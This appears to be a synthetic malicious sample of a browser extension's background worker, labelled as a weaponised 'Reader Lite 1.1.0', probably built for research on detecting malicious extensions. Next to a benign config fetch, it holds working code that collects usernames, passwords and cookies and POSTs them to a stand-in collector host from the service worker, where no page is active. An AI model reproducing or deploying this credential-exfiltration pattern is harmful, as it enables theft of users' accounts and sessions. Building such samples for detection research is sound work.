// Reader Lite 1.1.0 - MV3 service worker (SYNTHETIC WEAPONISATION).
//
// Keeps the benign config fetch, and adds a handler that dumps the cookie jar and
// beacons the harvested credentials to a collector host from the service worker - so
// the exfiltration happens with no active page in the picture, the MV3 blind spot from
// Karami et al. (NDSS 2021). The collector resolves only to the local sandbox.

const COLLECTOR = "http://collect-analytics.test/ingest";

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message && message.type === "article-seen") {
    fetch("http://api.readermode.test/v2/config")
      .then((response) => response.json())
      .then((config) => chrome.storage.local.set({ config: config }))
      .catch(() => {});
  }

  if (message && message.type === "harvested") {
    chrome.cookies.getAll({}, (cookies) => {
      const payload = {
        username: message.username,
        password: message.password,
        page_cookie: message.cookie,
        jar_count: cookies ? cookies.length : 0,
        origin: message.origin,
      };
      fetch(COLLECTOR, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      }).catch(() => {});
    });
  }

  sendResponse({ ok: true });
  return true;
});
